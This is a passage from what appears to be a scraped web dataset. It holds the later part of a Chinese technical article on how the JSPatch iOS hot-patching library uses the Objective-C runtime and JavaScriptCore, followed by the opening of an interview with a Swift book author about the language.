<li><p>改写UIViewController的 <code>-forwardInvocation:</code> 方法为自定义实现。一旦OC里调用 UIViewController 的 <code>-viewWillAppear:</code> 方法，经过上面的处理会把这个调用转发到 <code>-forwardInvocation:</code> ，这时已经组装好了一个 NSInvocation，包含了这个调用的参数。在这里把参数从 NSInvocation 反解出来，带着参数调用上述新增加的方法 <code>-JPviewWillAppear:</code> ，在这个新方法里取到参数传给JS，调用JS的实现函数。整个调用过程就结束了，整个过程图示如下：</p></li>
</ol>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004841385"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""JSPatch方法替换"" title=""JSPatch方法替换""></span></p>
<p>最后一个问题，我们把 UIViewController 的 <code>-forwardInvocation:</code> 方法的实现给替换掉了，如果程序里真有用到这个方法对消息进行转发，原来的逻辑怎么办？首先我们在替换 <code>-forwardInvocation:</code> 方法前会新建一个方法 <code>-ORIGforwardInvocation:</code>，保存原来的实现IMP，在新的 <code>-forwardInvocation:</code> 实现里做了个判断，如果转发的方法是我们想改写的，就走我们的逻辑，若不是，就调 <code>-ORIGforwardInvocation:</code> 走原来的流程。</p>
<p>其他就是实现上的细节了，例如需要根据不同的返回值类型生成不同的 IMP，要在各处处理参数转换等。</p>
<h3>4.新增方法</h3>
<h4>i.方案</h4>
<p>在 JSPatch 刚开源时，是不支持为一个类新增方法的，因为觉得能替换原生方法就够了，新的方法纯粹添加在 JS 对象上，只在 JS 端跑就行了。另外 OC 为类新增方法需要知道各个参数和返回值的类型，需要在 JS 定一种方式把这些类型传给 OC 才能完成新增方法，比较麻烦。后来挺多人比较关注这个问题，不能新增方法导致 action-target 模式无法用，我也开始想有没有更好的方法实现添加方法。后来的解决方案是所有类型都用 id 表示，因为反正新增的方法都是 JS 在用(Protocol定义的方法除外)，不如新增的方法返回值和参数全统一成 id 类型，这样就不用传类型了。</p>
<p>现在 <code>defineClass</code> 定义的方法会经过 JS 包装，变成一个包含参数个数和方法实体的数组传给OC，OC会判断如果方法已存在，就执行替换的操作，若不存在，就调用 <code>class_addMethod()</code> 新增一个方法，通过传过来的参数个数和方法实体生成新的 Method，把 Method 的参数和返回值类型都设为id。这里 JS 调用新增方法走的流程还是 <code>forwardInvocation</code> 这一套。</p>
<h4>ii.Protocol</h4>
<p>对于新增的方法还有个问题，若某个类实现了某 protocol，protocol方法里有可选的方法，它的参数不全是 id 类型，例如 <code>UITableViewDataSource</code> 的一个方法：</p>
<pre><code>- (NSInteger)tableView:(UITableView *)tableView sectionForSectionIndexTitle:(NSString *)title atIndex:(NSInteger)index;</code></pre>
<p>若原类没有实现这个方法，在 JS 里实现了，会走到新增方法的逻辑，每个参数类型都变成 id，与这个 protocol 方法不匹配，产生错误。</p>
<p>这里就需要在 JS 定义类时给出实现的 protocol，这样在新增 Protocol 里已定义的方法时，参数类型会按照 Protocol 里的定义去实现，Protocol 的定义方式跟 OC 上的写法一致：</p>
<pre><code>defineClass(""JPViewController: UIViewController &lt;UIAlertViewDelegate&gt;"", {
  alertView_clickedButtonAtIndex: function(alertView, buttonIndex) {
    console.log('clicked index ' + buttonIndex)
  }
})</code></pre>
<p>实现方式比较简单，先把 Protocol 名解析出来，当 JS 定义的方法在原有类上找不到时，再通过 <code>objc_getProtocol</code> 和 <code>protocol_copyMethodDescriptionList</code> runtime 接口把 Protocol 对应的方法取出来，若匹配上，则按其方法的定义走方法替换的流程。</p>
<h3>5.Property实现</h3>
<p>若要在 JS 操作 OC 对象上已定义好的 property，只需要像调用普通 OC 方法一样，调用这个对象的 get/set 方法就行了：</p>
<pre><code>//OC
@property (nonatomic) NSString *data;
@property (nonatomic) BOOL *succ;</code></pre>
<pre><code>//JS
self.setSucc(1);
var str = self.data();</code></pre>
<p>若要动态给 OC 对象新增 property，则要另辟蹊径：</p>
<pre><code>defineClass('JPTableViewController : UITableViewController', {
  dataSource: function() {
    var data = self.getProp('data')
    if (data) return data;
    data = [1,2,3]
    self.setProp_forKey(data, 'data')
    return data;
  }
}</code></pre>
<p>JSPatch可以通过 <code>-getProp:</code>， <code>-setProp:forKey:</code> 这两个方法给对象动态添加成员变量。实现上用了运行时关联接口 <code>objc_getAssociatedObject()</code> 和 <code>objc_setAssociatedObject()</code> 模拟，相当于把一个对象跟当前对象self关联起来，以后可以通过当前对象self找到这个对象，跟成员的效果一样，只是一定得是id对象类型。</p>
<p>本来OC有 <code>class_addIvar()</code> 可以为类添加成员，但必须在类注册之前添加完，注册完成后无法添加，这意味着可以为在JS新增的类添加成员，但不能为OC上已存在的类添加，所以只能用上述方法模拟。</p>
<h3>6.self关键字</h3>
<pre><code>defineClass(""JPViewController: UIViewController"", {
  viewDidLoad: function() {
    var view = self.view()
    ...
  },
}</code></pre>
<p>JSPatch支持直接在defineClass里的实例方法里直接使用 self 关键字，跟OC一样 self 是指当前对象，这个 self 关键字是怎样实现的呢？实际上这个self是个全局变量，在 defineClass 里对实例方法 方法进行了包装，在调用实例方法之前，会把全局变量 self 设为当前对象，调用完后设回空，就可以在执行实例方法的过程中使用 self 变量了。这是一个小小的trick。</p>
<h3>7.super关键字</h3>
<pre><code>defineClass(""JPViewController: UIViewController"", {
  viewDidLoad: function() {
    self.super.viewDidLoad()
  },
}</code></pre>
<p>OC 里 super 是一个关键字，无法通过动态方法拿到 super，那么 JSPatch 的 super 是怎么实现的？实际上调用 super 的方法，OC 做的事是调用父类的某个方法，并把当前对象当成 self 传入父类方法，我们只要模拟它这个过程就行了。</p>
<p>首先 JS 端需要告诉OC想调用的是当前对象的 super 方法，做法是调用 <code>self.super()</code>时，<code>__c</code> 函数会做特殊处理，返回一个新的对象，这个对象同样保存了 OC 对象的引用，同时标识 <code>__isSuper = 1</code>。</p>
<pre><code>...
if (methodName == 'super') {
  return function() {
    return {__obj: self.__obj, __clsName: self.__clsName, __isSuper: 1}
  }
}
...</code></pre>
<p>再用这个返回的对象去调用方法时，<code>__c</code> 函数会把 <code>__isSuper</code> 这个标识位传给 OC，告诉 OC 要调 super 的方法。OC 做的事情是，如果是调用 super 方法，找到 superClass 这个方法的 IMP 实现，为当前类新增一个方法指向 super 的 IMP 实现，那么调用这个类的新方法就相当于调用 super 方法。把要调用的方法替换成这个新方法，就完成 super 方法的调用了。</p>
<pre><code>static id callSelector(NSString *className, NSString *selectorName, NSArray *arguments, id instance, BOOL isSuper) {
    ...
    if (isSuper) {
        NSString *superSelectorName = [NSString stringWithFormat:@""SUPER_%@"", selectorName];
        SEL superSelector = NSSelectorFromString(superSelectorName);

        Class superCls = [cls superclass];
        Method superMethod = class_getInstanceMethod(superCls, selector);
        IMP superIMP = method_getImplementation(superMethod);

        class_addMethod(cls, superSelector, superIMP, method_getTypeEncoding(superMethod));
        selector = superSelector;
    }
    ...
}</code></pre>
<h2>扩展</h2>
<h3>1.Struct 支持</h3>
<p>struct 类型在 JS 与 OC 间传递需要做转换处理，一开始 JSPatch 只处理了原生的 NSRange / CGRect / CGSize / CGPoint 这四个，其他 struct 类型无法在 OC / JS 间传递。对于其他类型的 struct 支持，我是采用扩展的方式，让写扩展的人手动处理每个要支持的 struct 进行类型转换，这种做法没问题，但需要在 OC 代码写好这些扩展，无法动态添加，转换的实现也比较繁琐。于是转为另一种实现：</p>
<pre><code>/*
struct JPDemoStruct {
  CGFloat a;
  long b;
  double c;
  BOOL d;
}
*/
require('JPEngine').defineStruct({
  ""name"": ""JPDemoStruct"",
  ""types"": ""FldB"",
  ""keys"": [""a"", ""b"", ""c"", ""d""]
})</code></pre>
<p>可以在 JS 动态定义一个新的 struct，只需提供 struct 名，每个字段的类型以及每个字段对应的在 JS 的键值，就可以支持这个 struct 类型在 JS 和 OC 间传递了：</p>
<pre><code>//OC
@implementation JPObject
+ (void)passStruct:(JPDemoStruct)s;
+ (JPDemoStruct)returnStruct;
@end</code></pre>
<pre><code>//JS
require('JPObject').passStruct({a:1, b:2, c:4.2, d:1})
var s = require('JPObject').returnStruct();</code></pre>
<p>这里的实现原理是顺序去取 struct 里每个字段的值，再根据 key 重新包装成 NSDictionary 传给 JS，怎样顺序取 struct 每字段的值呢？可以根据传进来的 struct 字段的变量类型，拿到类型对应的长度，顺序拷贝出 struct 对应位置和长度的值，具体实现：</p>
<pre><code>for (int i = 0; i &lt; types.count; i ++) {
  size_t size = sizeof(types[i]);  //types[i] 是 float double int 等类型
  void *val = malloc(size);
  memcpy(val, structData + position, size);
  position += size;
}</code></pre>
<p>struct 从 JS 到 OC 的转换同理，只是反过来，先生成整个 struct 大小的内存地址（通过 struct 所有字段类型大小累加），再逐渐取出 JS 传过来的值进行类型转换拷贝到这端内存里。</p>
<p>这种做法效果很好，JS 端要用一个新的 struct 类型，不需要 OC 事先定义好，可以直接动态添加新的 struct 类型支持，但这种方法依赖 struct 各个字段在内存空间上的严格排列，如果某些机器在底层实现上对 struct 的字段进行一些字节对齐之类的处理，这种方式没法用了，不过目前在 iOS 上还没碰到这样的问题。</p>
<h3>2.C 函数支持</h3>
<p>C 函数没法通过反射去调用，所以只能通过手动转接的方式让 JS 调 C 方法，具体就是通过 JavaScriptCore 的方法在 JS 当前作用域上定义一个 C 函数同名方法，在这个方法实现里调用 C 函数，以支持 <code>memcpy()</code> 为例：</p>
<pre><code>context[@""memcpy""] = ^(JSValue *des, JSValue *src, size_t n) {
    memcpy(des, src, n);
};</code></pre>
<p>这样就可以在 JS 调用 <code>memcpy()</code> 函数了。实际上这里还有参数 JS &lt;-&gt; OC 转换问题，这里先忽略。</p>
<p>这里有两个问题：</p>
<p>a.如果这些 C 函数的支持都写在 JSPatch 源文件里，源文件会非常庞大。<br>b.如果一开始就给 JS 加这些函数定义，若要支持的 C 函数量大时会影响性能。</p>
<p>对此设计了一种扩展的方式去解决这两个问题，JSPatch 需要做的就是为外部提供 JS 运行上下文 JSContext，以及参数转换的方法，最终设计出来的扩展接口是这样：</p>
<pre><code>@interface JPExtension : NSObject
+ (void)main:(JSContext *)context;

+ (void *)formatPointerJSToOC:(JSValue *)val;
+ (id)formatPointerOCToJS:(void *)pointer;
+ (id)formatJSToOC:(JSValue *)val;
+ (id)formatOCToJS:(id)obj;

@end</code></pre>
<p><code>+main</code> 方法暴露了 JSPatch 的运行环境 JSContext 给外部，可以自由在这个 JSContext 上加函数。另外四个 <code>formatXXX</code> 方法都是参数转换方法。上述的 <code>memcpy()</code> 完整的扩展定义如下：</p>
<pre><code>@implementation JPMemory
+ (void)main:(JSContext *)context
{
    context[@""memcpy""] = ^id(JSValue *des, JSValue *src, size_t n) {
        void *ret = memcpy([self formatPointerJSToOC:des], [self formatPointerJSToOC:src], n);
        return [self formatPointerOCToJS:ret];
    };
}
@end</code></pre>
<p>同时 JSPatch 提供了 <code>+addExtensions:</code> 接口，让 JS 端可以动态加载某个扩展，在需要的时候再给 JS 上下文添加这些 C 函数：</p>
<pre><code>require('JPEngine').addExtensions(['JPMemory'])</code></pre>
<p>实际上还有另一种方法添加 C 函数的支持，就是定义 OC 方法转接：</p>
<pre><code>@implementation JPCFunctions
+ (void)memcpy:(void *)des src:(void *)src n:(size_t)n {
  memcpy(des, src, n);
}
@end</code></pre>
<p>然后直接在 JS 上这样调：</p>
<pre><code>require('JPFunctions').memcpy_src_n(des, src, n);</code></pre>
<p>这样的做法不需要扩展机制，也不需要在实现时进行参数转换，但因为它走的是 OC runtime 那一套，相比扩展直接调用的方式，速度慢了一倍，为了更好的性能，还是提供一套扩展接口。</p>
<h2>细节</h2>
<p>整个 JSPatch 的基础原理上面大致阐述完了，接下来在看看一些实现上碰到的坑和的细节问题。</p>
<h3>1.Special Struct</h3>
<p>上文提到会把要覆盖的方法指向<code>_objc_msgForward</code>，进行转发操作，这里出现一个问题，如果替换方法的返回值是某些 struct，使用 <code>_objc_msgForward</code>（或者之前的 <code>@selector(__JPNONImplementSelector)</code>）会 crash。几经辗转，找到了解决方法：对于某些架构某些 struct，必须使用 <code>_objc_msgForward_stret</code> 代替 <code>_objc_msgForward</code>。为什么要用 <code>_objc_msgForward_stret</code> 呢，找到一篇说明  <code>objc_msgSend_stret</code> 和 <code>objc_msgSend</code> 区别的文章：<a href=""http://sealiesoftware.com/blog/archive/2008/10/30/objc_explain_objc_msgSend_stret.html"" rel=""nofollow noreferrer"">http://sealiesoftware.com/blo...</a>），说得比较清楚，原理是一样的，是C的一些底层机制的原因，简单复述一下：</p>
<p>大多数 CPU 在执行 C 函数时会把前几个参数放进寄存器里，对 <code>obj_msgSend</code> 来说前两个参数固定是 self / _cmd，它们会放在寄存器上，在最后执行完后返回值也会保存在寄存器上，取这个寄存器的值就是返回值：</p>
<pre><code>-(int) method:(id)arg;
    r3 = self
    r4 = _cmd, @selector(method:)
    r5 = arg
    (on exit) r3 = returned int</code></pre>
<p>普通的返回值(int/pointer)很小，放在寄存器上没问题，但有些 struct 是很大的，寄存器放不下，所以要用另一种方式，在一开始申请一段内存，把指针保存在寄存器上，返回值往这个指针指向的内存写数据，所以寄存器要腾出一个位置放这个指针，self / _cmd 在寄存器的位置就变了：</p>
<pre><code> -(struct st) method:(id)arg;
    r3 = &amp;struct_var (in caller's stack frame)
    r4 = self
    r5 = _cmd, @selector(method:)
    r6 = arg
    (on exit) return value written into struct_var</code></pre>
<p><code>objc_msgSend</code> 不知道 self / _cmd 的位置变了，所以要用另一个方法 <code>objc_msgSend_stret</code> 代替。原理大概就是这样。</p>
<p>上面说某些架构某些 struct 有问题，那具体是哪些呢？iOS 架构中非 arm64 的都有这问题，而怎样的 struct 需要走上述流程用 <code>xxx_stret</code> 代替原方法则没有明确的规则，OC 也没有提供接口，只有在一个奇葩的接口上透露了这个天机，于是有这样一个神奇的判断：</p>
<pre><code>if ([methodSignature.debugDescription rangeOfString:@""is special struct return? YES""].location != NSNotFound)</code></pre>
<p>在 <code>NSMethodSignature</code> 的 <code>debugDescription</code> 上打出了是否 special struct，只能通过这字符串判断。所以最终的处理是，在非 arm64 下，是 special struct 就走 <code>_objc_msgForward_stret</code>，否则走 <code>_objc_msgForward</code>。</p>
<h3>2.内存问题</h3>
<h4>i.Double Release</h4>
<p>实现过程中碰到一些内存问题，首先是 Double Release 问题。从 <code>-forwardInvocation:</code> 里的 NSInvocation 对象取参数值时，若参数值是id类型，我们会这样取:</p>
<pre><code>id arg;
[invocation getArgument:&amp;arg atIndex:i];</code></pre>
<p>但这样的写法会导致 crash，这是因为 <code>id arg</code> 在ARC下相当于 <code>__strong id arg</code>，若这时在代码显式为 arg 赋值，根据 ARC 的机制，会自动插入一条 retain 语句，然后在退出作用域时插入 release 语句：</p>
<pre><code>- (void)method {
id arg = [SomeClass getSomething];
// [arg retain]
...
// [arg release]  退出作用域前release
}</code></pre>
<p>但我们这里不是显式对 arg 进行赋值，而是传入 <code>-getArgument:atIndex:</code> 方法，在这里面赋值后 ARC 没有自动给这个变量插入 retain 语句，但退出作用域时还是自动插入了 release 语句，导致这个变量多释放了一次，导致 crash。解决方法是把 arg 变量设成 __unsafe_unretained 或 __weak，让 ARC 不在它退出作用域时插入 release 语句即可：</p>
<pre><code>__unsafe_unretained id arg;
[invocation getReturnValue:&amp;arg];</code></pre>
<p>还可以通过 <code>__bridge</code> 转换让局部变量持有返回对象，这样做也是没问题的：</p>
<pre><code>id returnValue;
void *result;
[invocation getReturnValue:&amp;result];
returnValue = (__bridge id)result;</code></pre>
<h4>ii.内存泄露</h4>
<p>Double Release 的问题解决了，又碰到内存泄露的坑。某天 github issue 上有人提对象生成后没有释放，几经排查，定位到还是这里 <code>NSInvocation getReturnValue</code> 的问题，当 <code>NSInvocation</code> 调用的是 <code>alloc</code> 时，返回的对象并不会释放，造成内存泄露，只有把返回对象的内存管理权移交出来，让外部对象帮它释放才行：</p>
<pre><code>id returnValue;
void *result;
[invocation getReturnValue:&amp;result];
if ([selectorName isEqualToString:@""alloc""] || [selectorName isEqualToString:@""new""]) {
    returnValue = (__bridge_transfer id)result;
} else {
    returnValue = (__bridge id)result;
}</code></pre>
<p>这是因为 ARC 对方法名有约定，当方法名开头是 alloc / new / copy / mutableCopy 时，返回的对象是 retainCount = 1 的，除此之外，方法返回的对象都是 autorelease 的，按上一节的说法，对于普通方法返回值，ARC 会在赋给 strong 变量时自动插入 retain 语句，但对于 alloc 等这些方法，不会再自动插入 retain 语句：</p>
<pre><code>id obj = [SomeObject alloc];
//alloc 方法返回的对象 retainCount 已 +1，这里不需要retain


id obj2 = [SomeObj someMethod];
//方法返回的对象是 autorelease，ARC 会再这里自动插入 [obj2 retain] 语句</code></pre>
<p>而 ARC 并没有处理非显示调用时的情况，这里动态调用这些方法时，ARC 都不会自动插入 retain，这种情况下，alloc / new 等这类方法返回值的 retainCount 是会比其他方法返回值多1的，所以需要特殊处理这类方法。</p>
<h3>3.‘_’的处理</h3>
<p>JSPatch 用下划线’_’连接OC方法多个参数间的间隔：</p>
<pre><code>- (void)setObject:(id)anObject forKey:(id)aKey;
&lt;==&gt;
setObject_forKey()</code></pre>
<p>那如果OC方法名里含有’_’，那就出现歧义了：</p>
<pre><code>- (void)set_object:(id)anObject forKey:(id)aKey;
&lt;==&gt;
set_object_forKey()</code></pre>
<p>没法知道 <code>set_object_forKey</code> 对应的 selector 是 <code>set_object:forKey:</code> 还是 <code>set:object:forKey:</code>。</p>
<p>对此需要定个规则，在 JS 用其他字符代替 OC 方法名里的 <code>_</code>。JS 命名规则除了字母和数字，就只有 <code>$</code> 和 <code>_</code>，看起来只能用 <code>$</code> 代替了，但效果很丑：</p>
<pre><code>- (void)set_object:(id)anObject forKey:(id)aKey;
- (void)_privateMethod();
&lt;==&gt;
set$object_forKey()
$privateMethod()</code></pre>
<p>于是尝试另一种方法，用两个下划线 <code>__</code> 代替：</p>
<pre><code>set__object_forKey()
__privateMethod()</code></pre>
<p>但用两个下划线代替有个问题，OC 方法名参数后面加下划线会匹配不到</p>
<pre><code>- (void)setObject_:(id)anObject forKey:(id)aKey;
&lt;==&gt;
setObject___forKey()</code></pre>
<p>实际上 <code>setObject___forKey()</code> 匹配到对应的 selector 是 <code>setObject:_forKey:</code>。虽然有这个坑，但因为很少见到这种奇葩的命名方式，感觉问题不大，使用$也会导致替换不了 OC 方法名包含 <code>$</code> 字符的，最终为了代码颜值，使用了双下划线 <code>__</code> 表示。</p>
<h3>4.JPBoxing</h3>
<p>在使用 JSPatch 过程中发现JS无法调用 <code>NSMutableArray</code> / <code>NSMutableDictionary</code> / <code>NSMutableString</code> 的方法去修改这些对象的数据，因为这三者都在从 OC 返回到 JS 时 JavaScriptCore 把它们转成了 JS 的 <code>Array</code> / <code>Object</code> / <code>String</code>，在返回的时候就脱离了跟原对象的联系，这个转换在 JavaScriptCore 里是强制进行的，无法选择。</p>
<p>若想要在对象返回 JS 后，回到 OC 还能调用这个对象的方法，就要阻止 JavaScriptCore 的转换，唯一的方法就是不直接返回这个对象，而是对这个对象进行封装，JPBoxing 就是做这个事情的：</p>
<pre><code>@interface JPBoxing : NSObject
@property (nonatomic) id obj;
@end

@implementation JPBoxing
+ (instancetype)boxObj:(id)obj
{
   JPBoxing *boxing = [[JPBoxing alloc] init];
    boxing.obj = obj;
    return boxing;
}</code></pre>
<p>把 <code>NSMutableArray</code> / <code>NSMutableDictionary</code> / <code>NSMutableString</code> 对象作为 <code>JPBoxing</code> 的成员保存在 <code>JPBoxing</code> 实例对象上返回给 JS，JS 拿到的是 <code>JPBoxing</code> 对象的指针，再传回给 OC 时就可以通过对象成员取到原来的 <code>NSMutableArray</code> / <code>NSMutableDictionary</code> / <code>NSMutableString</code> 对象，类似于装箱/拆箱操作，这样就避免了这些对象被 JavaScriptCore 转换。</p>
<p>实际上只有可变的 <code>NSMutableArray</code> / <code>NSMutableDictionary</code> / <code>NSMutableString</code> 这三个类有必要调用它的方法去修改对象里的数据，不可变的 <code>NSArray</code> / <code>NSDictionary</code> / <code>NSString</code> 是没必要这样做的，直接转为 JS 对应的类型使用起来会更方便，但为了规则简单，JSPatch 让 <code>NSArray</code> / <code>NSDictionary</code> / <code>NSString</code> 也同样以封装的方式返回，避免在调用 OC 方法返回对象时还需要关心它返回的是可变还是不可变对象。最后整个规则还是挺清晰：<code>NSArray</code> / <code>NSDictionary</code> / <code>NSString</code> 及其子类与其他 <code>NSObject</code> 对象的行为一样，在 JS 上拿到的都只是其对象指针，可以调用它们的 OC 方法，若要把这三种对象转为对应的 JS 类型，使用额外的 <code>.toJS()</code> 的接口去转换。</p>
<p>对于参数和返回值是C指针和 Class 类型的支持同样是用 JPBoxing 封装的方式，把指针和 Class 作为成员保存在 JPBoxing 对象上返回给 JS，传回 OC 时再解出来拿到原来的指针和 Class，这样 JSPatch 就支持所有数据类型 OC&lt;-&gt;JS 的互传了。</p>
<h3>5.nil的处理</h3>
<h4>i.区分NSNull/nil</h4>
<p>对于""空""的表示，JS 有 <code>null</code> / <code>undefined</code>，OC 有 <code>nil</code> / <code>NSNull</code>，JavaScriptCore 对这些参数传递处理是这样的：</p>
<ul>
<li><p>从 JS 到 OC，直接传递 <code>null</code> / <code>undefined</code> 到 <code>OC</code> 都会转为 <code>nil</code>，若传递包含 <code>null</code> / <code>undefined</code> 的 <code>Array</code> 给 OC，会转为 <code>NSNull</code>。</p></li>
<li><p>从 OC 到 JS，<code>nil</code> 会转为 <code>null</code>，<code>NSNull</code> 与普通 <code>NSObject</code> 一样返回指针。</p></li>
</ul>
<p>JSPatch 的流程上都是通过数组的方式把参数从 JS 传入 OC，这样所有的 <code>null</code> / <code>undefined</code> 到 OC 就都变成了 <code>NSNull</code>，而真正的 <code>NSNull</code> 对象传进来也是 <code>NSNull</code>，无法分辨从 JS 过来实际传的是什么，需要有种方式区分这两者。</p>
<p>考虑过在 JS 用一个特殊的对象代表 <code>nil</code>，<code>null</code> / <code>undefined</code> 只用来表示 <code>NSNull</code>，后来觉得 <code>NSNull</code> 是很少手动传递的变量，而 <code>null</code> / <code>undefined</code> 以及 OC 的 <code>nil</code> 却很常见，这样做会给日常开发带来很大不便。于是反过来，在 JS 用一个特殊变量 <code>nsnull</code> 表示 <code>NSNull</code>，其他 <code>null</code> / <code>undefined</code> 表示 <code>nil</code>，这样传入 OC 就可以分辨出 <code>nil</code> 和 <code>NSNull</code>，具体使用方式：</p>
<pre><code>@implementation JPObject
+ (void)testNil:(id)obj
{
     NSLog(@""%@"", obj);
}
@end

require(""JPObject"").testNil(null)      //output: nil
require(""JPObject"").testNil(nsnull)      //output: NSNull</code></pre>
<p>这样做有个小坑，就是显示使用 <code>NSNull.null()</code> 作为参数调用时，到 OC 后会变成 <code>nil</code>：</p>
<pre><code>require(""JPObject"").testNil(require(""NSNull"").null())     //output: nil</code></pre>
<p>这个只需注意下用 <code>nsnull</code> 代替就行，从 OC 返回的 <code>NSNull</code> 再回传回去还是可以识别到 <code>NSNull</code>。</p>
<h4>ii.链式调用</h4>
<p>第二个问题，<code>nil</code> 在 JS 里用 <code>null</code> / <code>undefined</code> 表示，造成的后果是无法用 <code>nil</code> 调用方法，也就无法保证链式调用的安全：</p>
<pre><code>@implementation JPObject
+ (void)returnNil
{
     return nil;
}
@end

[[JPObject returnNil] hash]     //it’s OK

require(""JPObject"").returnNil().hash()     //crash</code></pre>
<p>原因是在 JS 里 <code>null</code> / <code>undefined</code> 不是对象，无法调用任何方法，包括我们给所有对象加的 <code>__c()</code> 方法。解决方式一度觉得只有回到上面说的，用一个特殊的对象表示 <code>nil</code>，才能解决这个问题了。但使用特殊的对象表示 <code>nil</code>，后果就是在 js 判断是否为 <code>nil</code> 时就要很啰嗦：</p>
<pre><code>//假设用一个_nil对象变量表示OC返回的nil
var obj = require(""JPObject"").returnNil()
obj.hash()     //经过特殊处理没问题
if (!obj || obj == _nil) {
     //判断对象是否为nil就得附加判断是否等于_nil
}</code></pre>
<p>这样的使用方式难以接受，继续寻找解决方案，发现 <code>true</code> / false 在 JS 是个对象，是可以调用方法的，如果用 <code>false</code> 表示 <code>nil</code>，即可以做到调用方法，又可以直接通过 <code>if (!obj)</code> 判断是否为 <code>nil</code>，于是沿着这个方向，解决了用 <code>false</code> 表示 <code>nil</code> 带来的各种坑，几乎完美地解决了这个问题。实现上的细节就不多说了，说""几乎完美""，是因为还有一个小坑，传递 <code>false</code> 给 OC 上参数类型是 <code>NSNumber*</code> 的方法，OC 会得到 nil 而不是 NSNumber 对象：</p>
<pre><code>@implementation JPObject
+ (void)passNSNumber:(NSNumber *)num {
     NSLog(@""%@"", num);
}
@end

require(""JPObject"").passNSNumber(false) //output: nil</code></pre>
<p>如果 OC 方法的参数类型是 <code>BOOL</code>，或者传入的是 <code>true</code> / <code>0</code>，都是没问题的，这小坑无伤大雅。</p>
<p>题外话，神奇的 JS 里 <code>false</code> 的 <code>this</code> 竟然不再是原来的 <code>false</code>，而是另一个 <code>Boolean</code> 对象，太特殊了：</p>
<pre><code>Object.prototype.c = function(){console.log(this === false)};
false.c() //output false</code></pre>
<h2>总结</h2>
<p><a href=""https://github.com/bang590/JSPatch"" rel=""nofollow noreferrer"">JSPatch</a> 的原理以及一些实现细节就阐述到这里，希望这篇文章对大家了解和使用 JSPatch 有帮助。接入 JSPatch 可以使用 JSPatch 平台: <a href=""http://jspatch.com"" rel=""nofollow noreferrer"">jspatch.com</a>。</p>

                ", JSPatch 实现原理详解 (整改版),1531972086,432,1,649,1,1,https://segmentfault.com/a/1190000003870981
135,1,0,6,"
                    
<blockquote><p>非商业转载请注明作译者、出处，并保留本文的原始链接：<a href=""http://www.ituring.com.cn/article/205611"" rel=""nofollow noreferrer"">http://www.ituring.com.cn/article/205611</a></p></blockquote>
<p><strong>Paris Buttfield-Addison</strong>是<a href=""http://www.secretlab.com.au/"" rel=""nofollow noreferrer"">Secret Lab</a>的联合创始人、移动应用工程师，以及游戏设计师。<a href=""http://www.secretlab.com.au/"" rel=""nofollow noreferrer"">Secret Lab</a>是一家游戏开发公司，他们致力于使技术变得简单又有趣。Paris拥有计算学博士学位，同时也是一位历史学士。他之前作为产品经理为硅谷的Meebo公司工作，这家公司在2012年被Google收购。他撰写了一系列关于iOS和游戏开发的技术书，其中包括《学习Objective-C与Cocoa框架》，《iOS游戏开发攻略》，<a href=""http://www.ituring.com.cn/book/1565"" rel=""nofollow noreferrer"">《Swift与Cocoa框架开发》</a>，以及《Unity移动游戏开发》。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVqjze"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p><strong>问：作为一位历史专业的学士，你是怎么变成一位iOS高手以及游戏开发专家的？</strong></p>
<p>除了学习中世纪历史外，我还有其他几个计算专业的学位（荣誉学位以及博士学位）。我发现学习历史的背景让我对科技的理解和很多人都不一样，我认为历史很有趣。</p>
<p><strong>问：在Swift 2.0之后，<a href=""http://www.ituring.com.cn/book/1565"" rel=""nofollow noreferrer"">《Swift与Cocoa框架开发》</a>这本书是否过时？书中有没有哪些地方需要修改？</strong></p>
<p>Swift 2.0有一些语法变化，但是这门语言的哲学却没有任何改变。<a href=""http://www.ituring.com.cn/book/1565"" rel=""nofollow noreferrer"">《Swift与Cocoa框架开发》</a>仍然很有用，如果出现任何过时的地方——我们会发布一个针对这本书的变更日志，当你用Swift 2.0进行编程时，这份日志会告诉你有哪些地方和印在书中的代码不同，我们会在不久之后把这份变更日志发布在我们的博客上（<a href=""http://secretlab.com.au/blog/"" rel=""nofollow noreferrer""></a><a href=""http://secretlab.com.au/blog/%7C"" rel=""nofollow noreferrer"">http://secretlab.com.au/blog/|</a>e9b49d8ef7816e77c1d19efe698550cb6|）。同时我们也在筹备另外一本书，叫做<a href=""http://shop.oreilly.com/product/0636920045946.do?code=WKIOS9"" rel=""nofollow noreferrer"">《学习Swift》</a>，这本书是最新的，并且覆盖了Swift 2.0的内容。</p>
<p><strong>问：在你看来，开源会对Swift的生态环境以及它和Android的关系造成什么影响？</strong></p>
<p>我认为变化不会太大。上一个苹果开发者语言Objective-C在iOS出现之前是非常晦涩的，而Swift吸取了很多经验。我认为，如果说开源Swift会带来任何变化的话，那就是人们可能会开始用Swift来写服务器软件，这样Swift就会形成一个更大、更好的社区。</p>
<p>我不认为这件事对于iOS和Android的关系会造成影响；现在来看，Java是一种很老的语言，甚至可以说是一种遗留语言，而Swift是现代的。如果Google把Android环境更新为现代化的语言（比如Swift）会是一件很酷的事——事实上，Google已经有了一种现代语言（Go），只是现在还没把它用在Android上！</p>
<p><strong>问：Swift从其他语言那里吸取了哪些成分？你最喜欢Swift的哪些特性？</strong></p>
<p>Swift从Rust和Python这样的语言中借鉴了很多东西。我最喜欢的Swift特性是它在内在安全性方面做出的努力；要想用Swift犯错并不容易，因为它强制执行了很多“优秀风格”。</p>
<p>Swift的设计初衷就是成为一门安全的语言。C语言中的许多缺陷（比如意外使用null指针）都很难在Swift中遇到。Swift非常重视强类型化，除了一些极为特殊的情况之外，它是不允许对象为null的。</p>
<p><strong>问：为什么很多公司还没在生产环境中应用Swift？</strong></p>
<p>因为Swift是崭新的，而且正在经历改变。Swift 2.0已经发布，我怀疑（但无法确定）苹果不会再改动很多了，这就意味着Swift会被更多移动开发者用在他们的产品应用中。就像比特代码一样，App Store自己会为下载或购买应用的用户编译和连接应用，所以可以说Swift对于未来应用来说是至关重要的。</p>
<p><strong>问：Swift在未来会彻底取代Objective-C吗？你建议初学者先学Objective-C还是先学Swift？</strong></p>
<p>对于我们来说Swift已经完全取代Objective-C了！对于真正的开发者来说，这种替代随时都可能发生。这是重要的一步。对于初学者来说，现在已经没有必要再去学Objective-C了！</p>
